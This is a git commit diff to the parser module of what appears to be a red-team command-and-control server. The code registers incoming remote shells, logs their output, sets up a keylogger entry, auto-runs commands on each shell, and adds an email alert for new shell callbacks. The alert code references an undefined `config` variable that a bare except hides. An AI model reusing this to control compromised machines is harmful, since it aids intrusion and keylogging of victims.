165fa3819705ea7cbab6594766812ef7e03535a8
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2019-06-17 14:57:54 -0400

    Update parser.py

--- core/parser.py
+++ core/parser.py
@@ -8,8 +8,7 @@
 from core.log import Log
 from core.ui import UI
 from core.utils import Utils
-import base64
-
+from core.notify import EmailNotify
 
 class HTTPDParser:
 
@@ -26,6 +25,7 @@ class HTTPDParser:
     def parse_cmd(self,guid,data,cmd_guid=None,):
         data = data.decode()
         cmd = data.split(" ", 1)[0].lower()
+        
         if cmd in self.cmds:
             callback = self.cmds[cmd]
             callback(guid, data)
@@ -35,19 +35,26 @@ class HTTPDParser:
             else:
                 # I assume we got command output here and save it
                 self.db.push_output(guid, data, cmd_guid)
-                Log.log_shell(guid, "Received", base64.b64decode(data).decode())
-                self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(), base64.b64decode(data).decode()))
+                Log.log_shell(guid, "Received", data)
+                self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(), data))
         return self.output
 
     def register(self, guid, data):
         if type(data) is not str:
             data = data.decode()
+            
         (cmd, guid, prompt) = data.split(" ", 2)
         self.db.set_prompt(guid, prompt)
         index = self.db.get_id(guid).decode()
         print("")
         UI.success("Registering new shell %s" % prompt)
         UI.success("New shell ID %s GUID is %s" % (index, guid))
+
+        try:
+            notify = EmailNotify(config)
+            notify.send_notification("NEW SHELL callback: %s" % prompt)
+        except:
+            UI.error("Notification failed", False)
         self.db.set_key("%s:keylogger" % guid, "")
         Log.log_event("New Shell", data)
         self.get_autocommands(guid)
@@ -78,10 +85,12 @@ class HTTPDParser:
     def get_autocommands(self, guid):
         profile = self.config.get("profile")
         commands = profile.get("autocommands")
+        
         if isinstance(commands, list):
             shell = self.db.get_prompt(guid).decode().split(" ")[1]
             UI.success("Running auto commands on shell %s" % shell)
             Log.log_event("Running auto commands on shell", shell)
+            
             for command in commands:
                 print("\t[+] %s" % command)
                 Log.log_shell(guid, "Sending", command)
